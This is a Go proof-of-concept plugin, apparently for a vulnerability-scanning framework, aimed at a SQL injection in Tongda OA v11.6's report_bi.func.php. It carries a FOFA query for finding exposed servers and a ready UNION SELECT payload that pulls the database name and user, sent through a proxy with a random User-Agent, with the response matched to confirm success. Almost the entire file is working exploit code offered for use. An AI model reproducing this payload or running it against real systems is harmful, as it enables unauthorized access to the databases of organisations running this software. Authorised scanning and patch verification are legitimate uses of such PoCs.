package main

import (
	"errors"
	"fmt"
	"github.com/ExpLangcn/HwToolslibrary/library/httpclient"
	"github.com/ExpLangcn/HwToolslibrary/library/info"
	"net/http"
	"strings"
)

var POC info.POC
var Httprecord = make(map[*httpclient.RequestOptions]*httpclient.Response) // 配置请求信息

func init() {
	POC = info.POC{ // 初始化POC信息
		Info: info.POCInfo{
			Name:     "通达OA_v11.6_report_bi.func_SQL注入漏洞",
			Author:   "ExpLang",
			Describe: "通达OA_v11.6_report_bi.func_存在SQL注入漏洞，攻击者通过漏洞可以获取数据库信息",
			Date:     "2023-09-26",
			Tags:     []string{"通达OA", "TongdaOA", "sqli", "sql注入"},
			Level:    "high",
			Link:     []string{"https://peiqi.h-k.pw/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20report_bi.func.php%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html"},
		},
		Other: info.OtherInfo{
			FOFAGrammar:  "app=\"TDXK-通达OA\"",
			QuakeGrammar: "",
		},
	}
}

func Start(Target string, ProxyURL string) (bool, error) {
	// 构建请求体
	requestBody := "_POST[dataset_id]=efgh%27-%40%60%27%60%29union+select+database%28%29%2C2%2Cuser%28%29%23%27&action=get_link_info"

	requestOption := &httpclient.RequestOptions{
		Method: http.MethodPost,
		URL:    Target + "/general/bi_design/appcenter/report_bi.func.php",
		Headers: map[string]string{
			"User-Agent":      httpclient.RandomUserAgent(),
			"Content-Type":    "application/x-www-form-urlencoded",
			"Content-Length":  fmt.Sprintf("%d", len(requestBody)),
			"Accept-Encoding": "gzip",
		},
		ProxyURL:    ProxyURL,
		RequestBody: []byte(requestBody),
	}

	// 发送请求
	responseOption, success := httpclient.SendRequest(*requestOption)
	Httprecord[requestOption] = responseOption

	if responseOption.Err != nil {
		// 处理错误
		return false, responseOption.Err
	} else {
		if !success {
			// 发送请求失败
			return false, errors.New("请求失败")
		}
	}

	POC.Info.HttpInfo = Httprecord

	statusCode := responseOption.StatusCode
	if statusCode == http.StatusOK {
		// 检查响应包内容是否包含 "col":" 字符串
		responseBody := string(responseOption.Body)
		if strings.Contains(responseBody, "col\":\"") {
			return true, nil
		}
	}
	return false, nil
}
